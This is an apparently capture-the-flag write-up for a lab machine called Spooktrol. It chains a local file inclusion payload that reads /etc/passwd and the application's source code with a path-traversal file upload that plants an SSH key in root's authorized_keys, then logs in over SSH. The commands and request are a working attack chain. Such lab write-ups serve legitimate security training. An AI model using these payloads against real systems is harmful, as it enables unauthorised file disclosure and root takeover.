# Alternative way to exploit Spooktrol

## Local File Inclusion on HTTP (Port 80)

The _file_ parameter on the web server has a **Local File Inclusion (LFI)** vulnerability that allows to read arbitrary files on the server:
```
http://10.10.11.123/file_management/?file=../../../etc/passwd
```

Fuzzing for the source code of the web application:
```
wfuzz -u 'http://10.10.11.123/file_management/?file=../FUZZ.py' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt --hc 500
```

It finds _server.py_:
```
curl http://10.10.11.123/file_management/?file=../server.py
```
```python
if __name__ == "__main__":
    uvicorn.run("app.main:app", host="0.0.0.0", port=8000, reload=True)
```

By going through the Python scripts, it is possible to get more filenames and download them all:
```
curl http://10.10.11.123/file_management/?file=../server.py -o server.py
curl http://10.10.11.123/file_management/?file=../app/main.py -o main.py
curl http://10.10.11.123/file_management/?file=../app/database.py -o database.py
curl http://10.10.11.123/file_management/?file=../app/models.py -o models.py
curl http://10.10.11.123/file_management/?file=../app/crud.py -o crud.py
```

The script _main.py_ has the most important information and the _file_upload_ function that uses a **PUT method**.
After analyzing the scripts, this method can be used to upload files:
```
curl -H 'Cookie: auth=2a' -X PUT -F file=@/etc/passwd 10.10.11.123/file_upload/ --proxy localhost:8080
```

After sending it to a proxy like **Burpsuite**, we can modify the filename and the contents to an SSH key.

Creating SSH key:
```
ssh-keygen -f spooktrol
```

Sending the modified PUT request to add the SSH key into the _authorized_keys_ file:
```
PUT /file_upload/ HTTP/1.1
Host: 10.10.11.123
(...)

Content-Disposition: form-data; name="file"; filename="../../../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDatCJzFU9eBOnfV(...)
```

After trying to SSH into the box on both open ports, we receive a connection on the SSH port 2222:
```
ssh -p 2222 -i spooktrol 10.10.11.123
```
